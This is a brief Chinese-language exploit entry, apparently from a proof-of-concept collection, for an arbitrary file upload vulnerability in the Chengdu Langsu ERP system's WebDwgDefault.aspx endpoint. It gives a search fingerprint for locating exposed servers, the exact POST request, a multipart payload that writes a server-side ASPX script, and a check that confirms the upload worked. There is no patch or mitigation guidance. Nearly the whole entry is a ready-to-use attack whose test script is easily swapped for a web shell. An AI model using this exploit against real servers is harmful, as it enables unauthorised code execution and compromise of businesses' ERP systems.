# 成都朗速ERP系统存WebDwgDefault存在任意文件上传漏洞

成都朗速ERP系统存 ｜ 文件上传 ｜ —
- **指纹**：`body="/Resource/Scripts/Yw/Yw_Bootstrap.js"`
- **请求**：`POST /WebDwgDefault.aspx?IsSave=true&FileName=test.asp HTTP/1.1`

**Payload**
```
------123
Content-Disposition: form-data; name="file"; filename="1.aspx"
<%
Response.Write("hello world")
%>
------123--
```
- **响应特征**：200 访问 http://目标网站/test.asp，若页面返回hello world，则漏洞利用成功。